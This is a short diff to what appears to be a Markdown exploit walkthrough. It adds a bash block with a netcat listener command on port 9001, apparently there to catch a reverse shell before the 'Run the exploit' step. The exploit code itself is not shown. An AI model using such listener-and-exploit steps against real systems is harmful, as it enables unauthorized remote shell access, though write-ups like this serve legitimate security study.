@@ -195,7 +195,10 @@ except Exception as e:
     print(sys.exc_value)
 ```
 
-### Setup a Listener on Port 9001
+## Setup a Listener on Port 9001
+```bash
+nc -lnvp 9001
+```
 
 Run the exploit:
 
